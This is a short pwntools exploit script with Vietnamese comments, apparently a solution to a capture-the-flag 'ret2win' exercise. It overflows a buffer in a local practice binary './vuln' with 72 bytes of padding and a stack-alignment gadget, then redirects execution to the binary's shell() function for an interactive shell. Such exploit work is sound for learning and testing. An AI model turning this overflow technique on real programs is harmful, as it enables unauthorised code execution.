#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
rop = ROP(exe)

# 1. Tìm gadget "ret"
g = rop.find_gadget(['ret'])

# 2. Rút địa chỉ ret_gadget từ đủ các kiểu trả về
if isinstance(g, int):
    ret_gadget = g
elif hasattr(g, 'address'):
    # pwnlib.rop.Gadget instance
    ret_gadget = g.address
elif isinstance(g, list):
    first = g[0]
    if isinstance(first, int):
        ret_gadget = first
    elif hasattr(first, 'address'):
        ret_gadget = first.address
    else:
        raise ValueError(f"Không hiểu format gadget list: {g!r}")
else:
    raise ValueError(f"Không hiểu format gadget: {g!r}")

# 3. Tạo payload
offset     = 64 + 8
shell_addr = exe.symbols['shell']

log.info(f"Offset       = {offset}")
log.info(f"ret gadget   = {hex(ret_gadget)}")
log.info(f"shell() addr = {hex(shell_addr)}")

payload = flat(
    b"A" * offset,
    p64(ret_gadget),   # align stack
    p64(shell_addr)    # jump vào shell()
)

# 4. Khởi tiến trình và gửi payload
p = process(exe.path)
# Nếu muốn debug với GDB:
# p = gdb.debug(exe.path, gdbscript="b vuln\ncontinue")

p.sendline(payload)
p.interactive()
